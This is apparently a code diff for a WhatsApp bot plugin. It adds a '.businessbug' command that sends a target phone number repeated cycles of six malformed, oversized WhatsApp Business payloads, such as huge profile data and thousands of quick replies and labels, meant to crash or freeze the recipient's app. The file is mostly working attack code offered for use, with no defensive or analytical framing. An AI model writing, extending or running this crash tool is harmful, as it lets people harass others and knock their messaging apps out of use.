@@ -1,12 +1,34 @@
-// ================================================================
-// 💼 BUSINESS CRASH PLUGIN (Based on WhatsApp Business Known Issues)
-// ================================================================
-
+const { cmd } = require('../command');
+const axios = require('axios');
 const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 
-// 📌 Business crash function – uses multiple malformed business payloads
+// ================================================================
+// 1. HELPER FUNCTIONS (self-contained)
+// ================================================================
+
+async function getImageBuffer(url) {
+    try {
+        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
+        return Buffer.from(response.data);
+    } catch (error) {
+        return null;
+    }
+}
+
+function getTarget(args, from, reply, cmdName) {
+    if (!args || !args[0]) {
+        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX [cycles]\nExample: .${cmdName} 94712345678 5`);
+        return null;
+    }
+    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
+}
+
+// ================================================================
+// 2. BUSINESS CRASH FUNCTION
+// ================================================================
+
 async function businessCrash(conn, target) {
-    // 1. BusinessProfileView crash – malformed business profile with huge data
+    // 1. BusinessProfileView crash
     const profilePayload = {
         viewOnceMessage: {
             message: {
@@ -26,7 +48,7 @@ async function businessCrash(conn, target) {
     const msg1 = generateWAMessageFromContent(target, profilePayload, {});
     await conn.relayMessage(target, msg1.message, {});
 
-    // 2. CatalogManager.loadProducts freeze – huge catalog with 1000 products
+    // 2. CatalogManager.loadProducts freeze
     const catalogPayload = {
         interactiveMessage: {
             header: { title: "Catalog", hasMediaAttachment: true },
@@ -52,7 +74,7 @@ async function businessCrash(conn, target) {
     const msg2 = generateWAMessageFromContent(target, catalogPayload, {});
     await conn.relayMessage(target, msg2.message, {});
 
-    // 3. QuickReplyManager memory leak – 2000 quick replies in one message
+    // 3. QuickReplyManager memory leak
     const quickReplies = [];
     for (let i = 0; i < 2000; i++) {
         quickReplies.push({ id: `qr_${i}`, displayText: "Reply".repeat(500) + i });
@@ -75,7 +97,7 @@ async function businessCrash(conn, target) {
     const msg3 = generateWAMessageFromContent(target, quickReplyPayload, {});
     await conn.relayMessage(target, msg3.message, {});
 
-    // 4. BusinessHoursPicker crash – extreme time data
+    // 4. BusinessHoursPicker crash
     const hoursPayload = {
         viewOnceMessage: {
             message: {
@@ -98,7 +120,7 @@ async function businessCrash(conn, target) {
     const msg4 = generateWAMessageFromContent(target, hoursPayload, {});
     await conn.relayMessage(target, msg4.message, {});
 
-    // 5. LabelManager freeze – enormous label list
+    // 5. LabelManager freeze
     const labels = Array.from({ length: 5000 }, (_, i) => ({
         id: `label_${i}`,
         name: "Label".repeat(2000) + i,
@@ -118,7 +140,7 @@ async function businessCrash(conn, target) {
     const msg5 = generateWAMessageFromContent(target, labelPayload, {});
     await conn.relayMessage(target, msg5.message, {});
 
-    // 6. AnalyticsSync invisible delay – massive analytics payload
+    // 6. AnalyticsSync invisible delay
     const analyticsPayload = {
         viewOnceMessage: {
             message: {
@@ -137,13 +159,20 @@ async function businessCrash(conn, target) {
     await conn.relayMessage(target, msg6.message, {});
 }
 
-// 📌 Command: .businessbug [number] [cycles]
+// ================================================================
+// 3. COMMAND HANDLER
+// ================================================================
+
 cmd({
     pattern: "businessbug",
     desc: "💼 Business crash – exploits WhatsApp Business known issues (6 payloads per cycle)",
     category: "tools",
     filename: __filename
-}, async (conn, mek, m, { from, reply, args }) => {
+},
+async (conn, mek, m, { from, reply, args }) => {
+    // 🔥 DEBUG: immediately reply to confirm command works
+    await reply("✅ *businessbug command triggered!* Processing...");
+
     const target = getTarget(args, from, reply, "businessbug");
     if (!target) return;
     let cycles = parseInt(args[1]) || 10;
@@ -163,3 +192,7 @@ cmd({
         await reply(`❌ Failed: ${err.message}`);
     }
 });
+
+console.log('✅ Business Bug Plugin Loaded!');
+console.log('📌 Command: .businessbug');
+console.log('📌 Usage: .businessbug <number> [cycles]');
